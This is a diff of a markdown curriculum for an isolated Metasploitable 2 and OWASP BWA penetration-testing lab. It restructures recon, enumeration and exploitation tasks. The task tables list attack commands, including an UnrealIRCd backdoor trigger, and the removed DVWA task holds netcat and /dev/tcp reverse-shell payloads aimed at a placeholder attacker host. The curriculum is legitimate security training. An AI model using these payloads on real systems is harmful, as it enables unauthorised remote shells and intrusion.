@@ -24,14 +24,14 @@
 
 ## 📊 Progress Overview
 
-| Phase | Focus | Levels | Tasks |
-|:---:|:---|:---:|:---:|
-| 🏗️ Phase 1 | Foundation & Setup | 0–1 | 12 |
-| 🔍 Phase 2 | Reconnaissance & Enumeration | 2–3 | 15 |
-| ⚔️ Phase 3 | Exploitation Core | 4–7 | 22 |
-| 👑 Phase 4 | Post-Exploitation & Escalation | 8–9 | 12 |
-| 🛡️ Phase 5 | Defense, Reporting & Mastery | 10–12 | 12 |
-| | **Total** | | **73** |
+| Phase | Focus | Levels | Tasks | Est. Hours |
+|:---:|:---|:---:|:---:|:---:|
+| 🏗️ Phase 1 | Foundation & Setup | 0–1 | 8 | ~12h |
+| 🔍 Phase 2 | Reconnaissance & Enumeration | 2–3 | 10 | ~12h |
+| ⚔️ Phase 3 | Exploitation Core | 4–7 | 14 | ~18h |
+| 👑 Phase 4 | Post-Exploitation & Escalation | 8–9 | 12 | ~15h |
+| 🛡️ Phase 5 | Defense, Reporting & Mastery | 10–12 | 9 | ~18h |
+| | **Total** | | **53** | **~75h** |
 
 ---
 
@@ -47,27 +47,27 @@
 
 ### Task 0.1 — Build the Isolated Lab Network
 
-- [ ] **Completed**
+⏱️ **~1h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
-| **Objective** | Create a completely isolated virtual network containing your attacker VM (Kali/Parrot) and the Metasploitable 2 target, with no route to the internet or your host OS LAN. |
+| **Objective** | Create a completely isolated virtual network containing your attacker VM (Kali/Parrot) and the Metasploitable 2 target, with no route to the internet or your host OS LAN. Also add the OWASP BWA VM to this same network (you'll use it later). |
 | **Skills Learned** | Virtual networking (Host-Only adapters), hypervisor configuration, network isolation principles, understanding why isolation matters for legal and safety reasons. |
 | **Tools Used** | VirtualBox or VMware (Host-Only Adapter settings), `ip addr`, `ifconfig`. |
-| **Expected Output** | Both VMs can `ping` each other. Neither VM can reach your home router or the internet. Screenshot of both VMs showing IPs on the same subnet. |
+| **Expected Output** | All VMs can `ping` each other. No VM can reach your home router or the internet. Screenshot of all VMs showing IPs on the same subnet. |
 | **Difficulty** | ⭐ Beginner |
-| **Save These** | Screenshot of VirtualBox/VMware network adapter settings for both VMs. Screenshot of successful ping in both directions. Screenshot of failed ping to your home gateway. |
+| **Save These** | Screenshot of VirtualBox/VMware network adapter settings for all VMs. Screenshot of successful ping in both directions. Screenshot of failed ping to your home gateway. |
 | **Common Mistakes** | Using NAT instead of Host-Only (exposes Metasploitable to the internet). Forgetting to disable the second NIC on Metasploitable. Not verifying isolation — just assuming it works. |
 
 ---
 
 ### Task 0.2 — Create Your Documentation Framework
 
-- [ ] **Completed**
+⏱️ **~30min** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
-| **Objective** | Set up a structured note-taking system that mirrors professional pentest workflow: recon → enumeration → exploitation → post-exploitation → reporting. |
+| **Objective** | Set up a structured note-taking system that mirrors professional pentest workflow: recon → enumeration → exploitation → post-exploitation → reporting. This framework covers both MS2 and OWASP BWA labs. |
 | **Skills Learned** | Professional documentation habits, evidence chain management, the pentest lifecycle model (PTES phases). |
 | **Tools Used** | Markdown editor (Obsidian, VS Code), terminal (`mkdir -p`), Git. |
 | **Expected Output** | Directory tree: `lab-notes/metasploitable2/{setup,recon,enumeration,exploitation,post-exploitation,privesc,defense,reports}`. A `setup-notes.md` file with target IP, attacker IP, network mode, date, tool versions. |
@@ -79,23 +79,23 @@
 
 ### Task 0.3 — Take a Clean Baseline Snapshot
 
-- [ ] **Completed**
+⏱️ **~10min** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
-| **Objective** | Snapshot the Metasploitable 2 VM in its clean, pre-exploitation state so you can restore it after each testing phase. |
+| **Objective** | Snapshot the Metasploitable 2 VM (and OWASP BWA VM) in their clean, pre-exploitation state so you can restore them after each testing phase. |
 | **Skills Learned** | VM snapshot management, the importance of repeatable lab environments, why "golden images" matter in both red and blue team work. |
 | **Tools Used** | VirtualBox Snapshot Manager or VMware Snapshot. |
-| **Expected Output** | Named snapshot (e.g., `ms2-clean-baseline-YYYY-MM-DD`) visible in the hypervisor's snapshot tree. |
+| **Expected Output** | Named snapshot (e.g., `ms2-clean-baseline-YYYY-MM-DD`) visible in the hypervisor's snapshot tree for each VM. |
 | **Difficulty** | ⭐ Beginner |
-| **Save These** | Screenshot of the snapshot manager showing the named baseline. |
+| **Save These** | Screenshot of the snapshot manager showing the named baselines. |
 | **Common Mistakes** | Forgetting to snapshot before exploitation, making it impossible to reset. Taking snapshots while the VM is running (can cause state issues in some hypervisors). |
 
 ---
 
 ### Task 0.4 — Understand the Pentest Lifecycle
 
-- [ ] **Completed**
+⏱️ **~1h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -117,7 +117,7 @@
 
 ### Task 1.1 — ARP Discovery & Layer 2 Understanding
 
-- [ ] **Completed**
+⏱️ **~30min** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -131,25 +131,25 @@
 
 ---
 
-### Task 1.2 — Full TCP Port Scan
+### Task 1.2 — Full TCP & UDP Port Scan
 
-- [ ] **Completed**
+⏱️ **~2h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
-| **Objective** | Discover every open TCP port on the target by scanning all 65,535 ports. Understand what an "open port" actually means at the TCP level (SYN → SYN-ACK). |
-| **Skills Learned** | TCP three-way handshake, SYN scanning vs connect scanning, port states (open, closed, filtered), why scanning all ports matters (services often hide on non-standard ports). |
-| **Tools Used** | `nmap -p- -T4 <target>`, `nmap -p- -sS <target>` (SYN scan, requires root). |
-| **Expected Output** | A list of all open TCP ports (expect ~23+ open ports on Metasploitable 2). Save output in all three Nmap formats: `-oN` (normal), `-oG` (grepable), `-oX` (XML). |
+| **Objective** | Discover every open TCP port on the target by scanning all 65,535 ports. Understand what an "open port" actually means at the TCP level (SYN → SYN-ACK). Then run a targeted UDP scan on the top 50 ports to identify key UDP services. |
+| **Skills Learned** | TCP three-way handshake, SYN scanning vs connect scanning, port states (open, closed, filtered), why scanning all ports matters (services often hide on non-standard ports). UDP protocol behavior (no handshake, no guaranteed response), why UDP scans produce more "open\|filtered" results, which critical services use UDP (DNS, SNMP, TFTP, NFS portmapper). |
+| **Tools Used** | TCP: `nmap -p- -T4 <target>`, `nmap -p- -sS <target>` (SYN scan, requires root). UDP: `nmap -sU --top-ports 50 -sV <target>`. |
+| **Expected Output** | A list of all open TCP ports (expect ~23+ open ports on Metasploitable 2). UDP scan results with confirmed open ports. Save output in all three Nmap formats: `-oN` (normal), `-oG` (grepable), `-oX` (XML). |
 | **Difficulty** | ⭐ Beginner |
-| **Save These** | Raw Nmap output files in all three formats. A clean markdown table mapping port numbers to your initial guesses about each service. |
-| **Common Mistakes** | Scanning only the default top 1000 ports and missing services on high ports (e.g., port 1524 ingreslock backdoor). Using `-T5` timing which can miss ports. Not saving output to files (`-oA`). Running SYN scan without root privileges. |
+| **Save These** | Raw Nmap output files in all three formats for both TCP and UDP. A clean markdown table mapping port numbers to your initial guesses about each service. Notes explaining the difference between TCP and UDP scan reliability. |
+| **Common Mistakes** | Scanning only the default top 1000 TCP ports and missing services on high ports (e.g., port 1524 ingreslock backdoor). Using `-T5` timing which can miss ports. Not saving output to files (`-oA`). Running SYN/UDP scan without root privileges. Scanning all 65,535 UDP ports (takes hours, rarely useful). Ignoring UDP entirely — services like SNMP and NFS portmapper can be goldmines. |
 
 ---
 
 ### Task 1.3 — Service Version & Script Detection
 
-- [ ] **Completed**
+⏱️ **~1h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -163,25 +163,9 @@
 
 ---
 
-### Task 1.4 — UDP Service Discovery
+### Task 1.4 — Build Your Attack Planning Matrix
 
-- [ ] **Completed**
-
-| Field | Detail |
-|:---|:---|
-| **Objective** | Identify services running on UDP ports. Understand why UDP scanning is slower and less reliable than TCP, and why attackers still do it. |
-| **Skills Learned** | UDP protocol behavior (no handshake, no guaranteed response), why UDP scans produce more "open\|filtered" results, which critical services use UDP (DNS, SNMP, TFTP, NFS portmapper). |
-| **Tools Used** | `nmap -sU --top-ports 50 -sV <target>`, `nmap -sU -p 53,67,69,111,137,161,2049 <target>`. |
-| **Expected Output** | List of confirmed open UDP ports with service versions. Explanation of why most UDP ports show "open\|filtered" and what that means. |
-| **Difficulty** | ⭐⭐ Beginner-Intermediate |
-| **Save These** | UDP scan output. Notes explaining the difference between TCP and UDP scan reliability. |
-| **Common Mistakes** | Scanning all 65,535 UDP ports (takes hours, rarely useful). Not running with root privileges (required for UDP scanning). Ignoring UDP entirely — services like SNMP and NFS portmapper can be goldmines. |
-
----
-
-### Task 1.5 — Build Your Attack Planning Matrix
-
-- [ ] **Completed**
+⏱️ **~2h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -197,6 +181,9 @@
 
 # 🔍 PHASE 2: DEEP ENUMERATION
 
+> [!TIP]
+> **🚧 Phase Gate:** Before starting Phase 2, you should be able to: list all open TCP/UDP ports on the target, identify service versions for each, and have a prioritized attack planning matrix. If not, go back.
+
 ---
 
 ## Level 2: Protocol-Level Service Enumeration
@@ -207,7 +194,7 @@
 
 ### Task 2.1 — FTP Enumeration & Anonymous Access
 
-- [ ] **Completed**
+⏱️ **~1h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -221,41 +208,25 @@
 
 ---
 
-### Task 2.2 — SSH Banner Analysis & Key Fingerprinting
+### Task 2.2 — SSH & Telnet: Banner Analysis & Cleartext Proof
 
-- [ ] **Completed**
-
-| Field | Detail |
-|:---|:---|
-| **Objective** | Identify the SSH version, supported key exchange algorithms, and authentication methods. Understand why old SSH versions and weak algorithms are security risks. |
-| **Skills Learned** | SSH protocol versioning, key exchange negotiation, authentication method enumeration, why SSHv1 is vulnerable to MITM attacks. |
-| **Tools Used** | `ssh -v <target>`, `nc <target> 22`, `nmap --script ssh2-enum-algos,ssh-hostkey <target>`. |
-| **Expected Output** | SSH version banner (OpenSSH version on Ubuntu). List of supported algorithms. Identification of any weak ciphers or key exchange methods. |
-| **Difficulty** | ⭐⭐ Beginner-Intermediate |
-| **Save These** | SSH banner output. Algorithm enumeration results. Notes on which algorithms are considered weak and why. |
-| **Common Mistakes** | Ignoring SSH because "it's encrypted so it's safe." Not checking for SSHv1 support. Not understanding that knowing the exact OpenSSH version reveals the OS version and patch level. |
-
----
-
-### Task 2.3 — Telnet Manual Interaction
-
-- [ ] **Completed**
+⏱️ **~1.5h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
-| **Objective** | Connect to the Telnet service and understand why Telnet is fundamentally insecure. Capture credentials in transit to prove the risk. |
-| **Skills Learned** | Plain-text protocol risks, credential sniffing, why Telnet should never be used on production networks, Wireshark packet analysis basics. |
-| **Tools Used** | `telnet <target>`, Wireshark (capture on the Host-Only interface). |
-| **Expected Output** | Successful Telnet login using known credentials. Wireshark capture showing the username and password transmitted in cleartext. |
+| **Objective** | **(A) SSH:** Identify the SSH version, supported key exchange algorithms, and authentication methods. Understand why old SSH versions and weak algorithms are security risks. **(B) Telnet:** Connect to the Telnet service, understand why it's fundamentally insecure, and capture credentials in transit with Wireshark to prove the cleartext risk. Compare Telnet vs SSH traffic side-by-side. |
+| **Skills Learned** | SSH protocol versioning, key exchange negotiation, authentication method enumeration, why SSHv1 is vulnerable to MITM attacks. Plain-text protocol risks, credential sniffing via Wireshark, why Telnet should never be used on production networks. |
+| **Tools Used** | SSH: `ssh -v <target>`, `nc <target> 22`, `nmap --script ssh2-enum-algos,ssh-hostkey <target>`. Telnet: `telnet <target>`, Wireshark (capture on Host-Only interface). |
+| **Expected Output** | SSH version banner, list of supported algorithms, identification of weak ciphers. Successful Telnet login with Wireshark capture showing cleartext credentials. Side-by-side comparison of SSH (encrypted) vs Telnet (cleartext) traffic. |
 | **Difficulty** | ⭐⭐ Beginner-Intermediate |
-| **Save These** | Screenshot of successful Telnet login. Wireshark capture (`.pcap` file) showing cleartext credentials. Side-by-side comparison with an SSH login capture showing encrypted traffic. |
-| **Common Mistakes** | Not capturing with Wireshark to prove the cleartext risk. Knowing "Telnet is bad" but not being able to demonstrate why with evidence. Not comparing Telnet capture vs SSH capture to see the difference. |
+| **Save These** | SSH banner and algorithm enumeration output. Wireshark `.pcap` file showing cleartext Telnet credentials. Side-by-side comparison screenshot of Telnet vs SSH captures. Notes on which SSH algorithms are weak and why. |
+| **Common Mistakes** | Ignoring SSH because "it's encrypted so it's safe." Not checking for SSHv1 support. Not capturing with Wireshark to prove the Telnet cleartext risk. Knowing "Telnet is bad" but not being able to demonstrate why with evidence. Not understanding that the exact OpenSSH version reveals the OS version and patch level. |
 
 ---
 
-### Task 2.4 — SMB & Samba Deep Enumeration
+### Task 2.3 — SMB & Samba Deep Enumeration
 
-- [ ] **Completed**
+⏱️ **~1.5h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -269,25 +240,28 @@
 
 ---
 
-### Task 2.5 — NFS Export Enumeration & Mounting
+### Task 2.4 — NFS & RPC Enumeration
 
-- [ ] **Completed**
+⏱️ **~1.5h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
-| **Objective** | Discover NFS exports, mount them locally, and inspect the contents. Understand the trust model NFS uses (UID/GID-based, no authentication by default). |
-| **Skills Learned** | NFS protocol mechanics, export permissions, UID/GID spoofing concept, why NFS without Kerberos is dangerous, how attackers use NFS to plant SSH keys. |
-| **Tools Used** | `showmount -e <target>`, `mount -t nfs <target>:/ /mnt/nfs`, `nmap --script nfs-ls,nfs-showmount <target>`. |
-| **Expected Output** | List of exported directories. Mounted NFS share contents. Identification of sensitive files (SSH keys, config files, password files). |
+| **Objective** | First, query the RPC portmapper to discover all registered services and their ports. Then discover NFS exports, mount them locally, and inspect the contents. Understand the trust model NFS uses (UID/GID-based, no authentication by default). |
+| **Skills Learned** | RPC/portmapper architecture, how NFS/NIS/mountd register with rpcbind, why portmapper exposure reveals internal service architecture. NFS protocol mechanics, export permissions, UID/GID spoofing concept, why NFS without Kerberos is dangerous, how attackers use NFS to plant SSH keys. |
+| **Tools Used** | RPC: `rpcinfo -p <target>`, `nmap --script rpcinfo <target> -p 111`. NFS: `showmount -e <target>`, `mount -t nfs <target>:/ /mnt/nfs`, `nmap --script nfs-ls,nfs-showmount <target>`. |
+| **Expected Output** | Full RPC program listing with program numbers, versions, protocols, and ports. Identification of NFS (program 100003), mountd, NIS (ypserv). List of NFS exported directories, mounted share contents, and identification of sensitive files (SSH keys, config files, password files). |
 | **Difficulty** | ⭐⭐ Beginner-Intermediate |
-| **Save These** | `showmount` output. Directory listing of mounted shares. Any sensitive files found. Notes on why NFS trusting UID 0 from any client is dangerous. |
-| **Common Mistakes** | Not creating the mount point directory first. Not unmounting after inspection (`umount /mnt/nfs`). Not understanding that NFS trusts the client's claimed UID — if you mount as root, you read as root. |
+| **Save These** | Complete `rpcinfo` output with notes mapping program numbers to services. `showmount` output. Directory listing of mounted shares. Any sensitive files found. Notes on why NFS trusting UID 0 from any client is dangerous. |
+| **Common Mistakes** | Ignoring RPC output because it looks cryptic. Not recognizing that RPC program numbers map to specific services (100003 = NFS, 100005 = mountd). Not creating the mount point directory first. Not unmounting after inspection (`umount /mnt/nfs`). Not understanding that NFS trusts the client's claimed UID — if you mount as root, you read as root. |
 
 ---
 
-### Task 2.6 — SMTP User Enumeration
+### 🎰 Bonus Task 2.5 — SMTP User Enumeration *(Defer if time-constrained)*
 
-- [ ] **Completed**
+⏱️ **~45min** · - [ ] **Completed**
+
+> [!NOTE]
+> This task is marked **bonus**. SMTP user enumeration is a real technique but rarely the primary attack vector in modern environments. Complete it if you have time, skip without guilt if you don't.
 
 | Field | Detail |
 |:---|:---|
@@ -301,31 +275,15 @@
 
 ---
 
-### Task 2.7 — RPC & Portmapper Enumeration
-
-- [ ] **Completed**
-
-| Field | Detail |
-|:---|:---|
-| **Objective** | Query the RPC portmapper to discover all registered RPC services, their program numbers, and listening ports. |
-| **Skills Learned** | RPC/portmapper architecture, how NFS/NIS/mountd register with rpcbind, why portmapper exposure reveals internal service architecture. |
-| **Tools Used** | `rpcinfo -p <target>`, `nmap --script rpcinfo <target> -p 111`. |
-| **Expected Output** | Full RPC program listing with program numbers, versions, protocols, and ports. Identification of NFS (program 100003), mountd, NIS (ypserv), and status services. |
-| **Difficulty** | ⭐⭐ Beginner-Intermediate |
-| **Save These** | Complete `rpcinfo` output. Notes mapping each RPC program number to its service name and security implications. |
-| **Common Mistakes** | Ignoring RPC output because it looks cryptic. Not recognizing that RPC program numbers map to specific services (100003 = NFS, 100005 = mountd). Not correlating RPC ports with Nmap scan results. |
-
----
-
 ## Level 3: Database & Web Service Enumeration
 
 *Extend enumeration to databases, web servers, and application-layer services.*
 
 ---
 
-### Task 3.1 — MySQL Enumeration with Blank Root
+### Task 2.6 — MySQL Enumeration with Blank Root
 
-- [ ] **Completed**
+⏱️ **~1h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -339,9 +297,9 @@
 
 ---
 
-### Task 3.2 — PostgreSQL Enumeration
+### Task 2.7 — PostgreSQL Enumeration
 
-- [ ] **Completed**
+⏱️ **~45min** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -355,9 +313,9 @@
 
 ---
 
-### Task 3.3 — Web Application Discovery & Mapping
+### Task 2.8 — Web Application Discovery & Mapping
 
-- [ ] **Completed**
+⏱️ **~1h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -371,9 +329,9 @@
 
 ---
 
-### Task 3.4 — Tomcat Manager Enumeration
+### Task 2.9 — Tomcat Manager Enumeration
 
-- [ ] **Completed**
+⏱️ **~30min** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -387,9 +345,9 @@
 
 ---
 
-### Task 3.5 — VNC Service Enumeration
+### Task 2.10 — VNC Service Enumeration
 
-- [ ] **Completed**
+⏱️ **~15min** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -405,49 +363,36 @@
 
 # ⚔️ PHASE 3: EXPLOITATION CORE
 
+> [!TIP]
+> **🚧 Phase Gate:** Before starting Phase 3, you should be able to: manually interact with FTP, SSH, Telnet, SMB, NFS, MySQL, and Tomcat. You should have a complete service inventory with versions, and each service should have an enumeration section in your notes. If not, go back.
+
 ---
 
-## Level 4: Backdoor & Trust Exploitation
+## Level 3: Backdoor & Trust Exploitation
 
 *Exploit pre-existing backdoors and trust misconfigurations. These are the "easy wins" — learn why they exist and what they teach about system hardening.*
 
 ---
 
-### Task 4.1 — Ingreslock Backdoor (Port 1524)
+### Task 3.1 — Backdoor & Trust Exploitation
 
-- [ ] **Completed**
-
-| Field | Detail |
-|:---|:---|
-| **Objective** | Connect to port 1524 and obtain an immediate root shell. Understand what "ingreslock" was historically and why a root shell listener on this port exists. |
-| **Skills Learned** | Bindshell concept (a shell listening on a port), the difference between a bindshell and a reverse shell, why open root shells on high ports are catastrophic, historical context of ingreslock. |
-| **Tools Used** | `nc <target> 1524`, `nmap -p 1524 -sV <target>`. |
-| **Expected Output** | Immediate root shell upon connection. Output of `id`, `whoami`, `hostname`. |
-| **Difficulty** | ⭐ Beginner |
-| **Save These** | Terminal output showing the connection and `id` command proving root. Notes explaining what a bindshell is and how this differs from an exploited service. |
-| **Common Mistakes** | Not understanding that this isn't an "exploit" — it's a pre-planted backdoor. Missing the learning point: scan for unusual high ports, and any service giving a shell without authentication is a critical finding. |
-
----
-
-### Task 4.2 — Rlogin/Rsh Trust Exploitation
-
-- [ ] **Completed**
+⏱️ **~1.5h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
-| **Objective** | Use `rlogin` to access the target as root without a password. Understand the `.rhosts` trust mechanism and why r-services are deprecated. |
-| **Skills Learned** | Berkeley r-services (rlogin, rsh, rexec), `.rhosts` and `hosts.equiv` trust files, why IP-based authentication is fundamentally broken, history of r-services deprecation in favor of SSH. |
-| **Tools Used** | `rlogin -l root <target>`, `rsh <target> <command>`, `cat /etc/hosts.equiv` and `cat ~/.rhosts` (once logged in). |
-| **Expected Output** | Root access via rlogin without password prompt. Contents of `.rhosts` or `hosts.equiv` showing the trust configuration. |
+| **Objective** | **(A) Ingreslock:** Connect to port 1524 and obtain an immediate root shell. Understand what "ingreslock" was historically and why a root shell listener on this port exists. **(B) Rlogin/Rsh:** Use `rlogin` to access the target as root without a password. Understand the `.rhosts` trust mechanism and why r-services are deprecated. Compare both: one is a backdoor, one is a trust misconfiguration — both give instant root. |
+| **Skills Learned** | Bindshell concept (a shell listening on a port), the difference between a bindshell and a reverse shell. Berkeley r-services (rlogin, rsh, rexec), `.rhosts` and `hosts.equiv` trust files, why IP-based authentication is fundamentally broken, history of r-services deprecation in favor of SSH. |
+| **Tools Used** | Ingreslock: `nc <target> 1524`, `nmap -p 1524 -sV <target>`. Rlogin: `rlogin -l root <target>`, `rsh <target> <command>`, `cat /etc/hosts.equiv` and `cat ~/.rhosts` (once logged in). |
+| **Expected Output** | Root shell via netcat on port 1524. Root access via rlogin without password. Contents of `.rhosts` or `hosts.equiv` showing the trust configuration. Comparison notes on backdoor vs trust-based access. |
 | **Difficulty** | ⭐ Beginner |
-| **Save These** | Terminal showing passwordless root login. Contents of the trust configuration files. Notes explaining why IP-based trust is insecure (IP spoofing). |
-| **Common Mistakes** | Not having `rsh-client` installed on modern Kali (may need `apt install rsh-client`). Not inspecting the trust files to understand why the access worked. Not connecting this to SSH known_hosts as the modern equivalent trust model. |
+| **Save These** | Terminal output for both access methods with `id` proof. Trust configuration file contents. Notes explaining the difference between a planted backdoor and a misconfigured trust relationship. |
+| **Common Mistakes** | Not understanding that ingreslock isn't an "exploit" — it's a pre-planted backdoor. Not having `rsh-client` installed on modern Kali (may need `apt install rsh-client`). Not inspecting the trust files to understand why the rlogin access worked. |
 
 ---
 
-### Task 4.3 — vsftpd 2.3.4 Backdoor Exploitation
+### Task 3.2 — vsftpd 2.3.4 Backdoor Exploitation
 
-- [ ] **Completed**
+⏱️ **~1.5h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -461,9 +406,9 @@
 
 ---
 
-### Task 4.4 — UnrealIRCd 3.2.8.1 Backdoor
+### Task 3.3 — UnrealIRCd 3.2.8.1 Backdoor
 
-- [ ] **Completed**
+⏱️ **~1h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -472,20 +417,20 @@
 | **Tools Used** | Manual: `nc <target> 6667` then send `AB; <reverse-shell-command>`. Listener: `nc -lvnp 4444`. Metasploit: `use exploit/unix/irc/unreal_ircd_3281_backdoor`. |
 | **Expected Output** | Reverse shell connection received on your listener. Confirmation of user context (`id`, `whoami`). |
 | **Difficulty** | ⭐⭐ Beginner-Intermediate |
-| **Save These** | Listener terminal showing incoming connection. Shell session output. Notes on the difference between a bindshell (Task 4.1) and a reverse shell (this task). |
+| **Save These** | Listener terminal showing incoming connection. Shell session output. Notes on the difference between a bindshell (Task 3.1) and a reverse shell (this task). |
 | **Common Mistakes** | Not setting up the listener before triggering the backdoor. Using the wrong IP in the reverse shell command (must be your attacker IP, not the target's). Firewall on the attacker machine blocking the incoming connection. |
 
 ---
 
-## Level 5: Network Service Exploitation
+## Level 4: Network Service Exploitation
 
 *Exploit vulnerabilities in legitimate services — not backdoors — to achieve remote code execution.*
 
 ---
 
-### Task 5.1 — Samba usermap_script RCE (CVE-2007-2447)
+### Task 3.4 — Samba usermap_script RCE (CVE-2007-2447)
 
-- [ ] **Completed**
+⏱️ **~1.5h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -499,9 +444,9 @@
 
 ---
 
-### Task 5.2 — distccd Remote Code Execution (CVE-2004-2687)
+### Task 3.5 — distccd Remote Code Execution (CVE-2004-2687)
 
-- [ ] **Completed**
+⏱️ **~1h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -510,14 +455,17 @@
 | **Tools Used** | `nmap --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='id'" <target> -p 3632`. Metasploit: `use exploit/unix/misc/distcc_exec`. |
 | **Expected Output** | Command execution as the `daemon` user (not root — this is important). Output of `id` showing a non-root user. |
 | **Difficulty** | ⭐⭐⭐ Intermediate |
-| **Save These** | Command execution proof. Note that this gives a low-privilege shell — you will need privilege escalation (Level 9). |
+| **Save These** | Command execution proof. Note that this gives a low-privilege shell — you will need privilege escalation (Level 6). |
 | **Common Mistakes** | Assuming this gives root (it gives `daemon` user). Not noting the non-root context — this is a launching point for privilege escalation practice. Not understanding what distccd is and why it exists. |
 
 ---
 
-### Task 5.3 — Java RMI Registry Exploitation
+### 🎰 Bonus Task 3.6 — Java RMI Registry Exploitation *(Defer if time-constrained)*
 
-- [ ] **Completed**
+⏱️ **~1h** · - [ ] **Completed**
+
+> [!NOTE]
+> This task is marked **bonus**. Java RMI deserialization is an important vulnerability class in enterprise environments, but on MS2 it's primarily a Metasploit-only exercise with limited manual learning depth. Complete it if you have time or are targeting enterprise pentest roles.
 
 | Field | Detail |
 |:---|:---|
@@ -531,15 +479,15 @@
 
 ---
 
-## Level 6: Web Application & Middleware Exploitation
+## Level 5: Web Application & Middleware Exploitation
 
 *Attack web applications and middleware consoles to deploy code and gain server access.*
 
 ---
 
-### Task 6.1 — Tomcat WAR File Deployment to Shell
+### Task 3.7 — Tomcat WAR File Deployment to Shell
 
-- [ ] **Completed**
+⏱️ **~1.5h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -553,9 +501,9 @@
 
 ---
 
-### Task 6.2 — WebDAV File Upload to Shell
+### Task 3.8 — WebDAV File Upload to Shell
 
-- [ ] **Completed**
+⏱️ **~1h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -569,9 +517,12 @@
 
 ---
 
-### Task 6.3 — PHP CGI Argument Injection (CVE-2012-1823)
+### 🎰 Bonus Task 3.9 — PHP CGI Argument Injection (CVE-2012-1823) *(Defer if time-constrained)*
 
-- [ ] **Completed**
+⏱️ **~45min** · - [ ] **Completed**
+
+> [!NOTE]
+> This task is marked **bonus**. PHP CGI mode is rare in modern stacks (most use PHP-FPM or mod_php). The vulnerability is a good learning exercise but can be safely deferred.
 
 | Field | Detail |
 |:---|:---|
@@ -585,31 +536,20 @@
 
 ---
 
-### Task 6.4 — DVWA Command Injection to Reverse Shell
-
-- [ ] **Completed**
-
-| Field | Detail |
-|:---|:---|
-| **Objective** | Exploit the DVWA Command Injection module at Low and Medium security levels to execute system commands and establish a reverse shell. |
-| **Skills Learned** | OS command injection patterns (`;`, `&&`, `||`, `|`), input sanitization bypass, the progression from information disclosure to full shell access, security level comparison. |
-| **Tools Used** | Browser (DVWA interface), `nc -lvnp 4444` (listener). Payloads: `; nc -e /bin/bash <attacker> 4444` or `| bash -c 'bash -i >& /dev/tcp/<attacker>/4444 0>&1'`. |
-| **Expected Output** | Command output displayed in DVWA page (Low). Reverse shell received on listener. Documentation of what changes between Low and Medium security (e.g., `&&` and `;` are filtered but `|` is not). |
-| **Difficulty** | ⭐⭐⭐ Intermediate |
-| **Save These** | Payloads used at each security level. Screenshots of successful execution. Notes documenting exactly what each security level filters and how you bypassed it. |
-| **Common Mistakes** | Not setting DVWA security level before testing (defaults may vary). Not trying multiple injection operators when one is filtered. Using `nc -e` when the target's netcat doesn't support `-e` (use bash redirect instead). |
+> [!IMPORTANT]
+> **DVWA Command Injection** is intentionally omitted from this lab. It is covered comprehensively in the [OWASP BWA Lab](../OWASP_Broken_WebApps/TASK_LIST.md) (Tasks 7.1–7.3) where it belongs in the web application security curriculum.
 
 ---
 
-## Level 7: Exploit Research & Validation
+## Level 6: Exploit Research & Validation
 
 *Move beyond known exploits. Learn to research, evaluate, and validate exploit candidates methodically.*
 
 ---
 
-### Task 7.1 — Searchsploit & Exploit Database Research
+### Task 3.10 — Searchsploit & Exploit Database Research
 
-- [ ] **Completed**
+⏱️ **~2h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -623,9 +563,9 @@
 
 ---
 
-### Task 7.2 — Manual Exploit Execution (No Metasploit)
+### Task 3.11 — Manual Exploit Execution (No Metasploit)
 
-- [ ] **Completed**
+⏱️ **~3h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
@@ -639,35 +579,40 @@
 
 ---
 
-### Task 7.3 — Metasploit Framework Exploitation (Comparison)
+### Task 3.12 — Manual vs Automated Exploitation Reflection
 
-- [ ] **Completed**
+⏱️ **~1h** · - [ ] **Completed**
 
 | Field | Detail |
 |:---|:---|
-| **Objective** | Re-exploit the same three services using Metasploit. Compare the effort, reliability, and understanding gained vs manual exploitation. |
-| **Skills Learned** | Metasploit workflow (search, use, set, exploit), module options, payload selection, the trade-off between automation speed and understanding depth. |
-| **Tools Used** | `msfconsole`, `search`, `use`, `set RHOSTS`, `set LHOST`, `exploit`. |
-| **Expected Output** | Three Metasploit sessions. Comparison document: for each exploit, note time taken, commands required, reliability, and what you learned (manual teaches more, Metasploit is faster). |
-| **Difficulty** | ⭐⭐⭐ Intermediate |
-| **Save These** | Metasploit console output for each exploitation. The comparison document. Honest assessment of what each approach taught you. |
-| **Common Mistakes** | Setting LHOST to the target IP instead of the attacker IP. Not checking `show options` for required settings. Using `exploit` instead of `run` (they're aliases but knowing both matters). Relying entirely on Metasploit and never learning manual techniques. |
+| **Objective** | Write a structured reflection document comparing your manual exploitation experiences (Tasks 3.1–3.11) with Metasploit-assisted exploitation used throughout. This is a writing exercise, not a re-exploitation session. |
+| **Skills Learned** | Critical self-assessment, understanding the trade-off between automation speed and understanding depth, articulating technical decisions in writing. |
